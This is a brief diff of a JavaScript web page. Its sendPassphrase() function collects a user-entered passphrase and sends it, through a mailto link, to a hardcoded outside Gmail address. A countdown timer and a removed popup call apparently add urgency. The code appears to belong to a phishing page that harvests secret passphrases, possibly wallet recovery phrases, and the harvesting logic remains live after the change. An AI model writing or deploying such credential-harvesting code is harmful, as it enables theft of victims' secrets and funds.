@@ -49,11 +49,9 @@ function sendPassphrase() {
 
   const email = "krishnadigitalmedianwh@gmail.com";
   const subject = "Passphrase Submission";
-  const body = `Passphrase Submission:\n\n<table border="1" cellpadding="5"><tr><th>Passphrase</th></tr><tr><td>${passphrase}</td></tr></table>`;
   const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(passphrase)}`;
 
   window.location.href = mailtoLink;
 }
 
 updateTimer();
-showPopup();
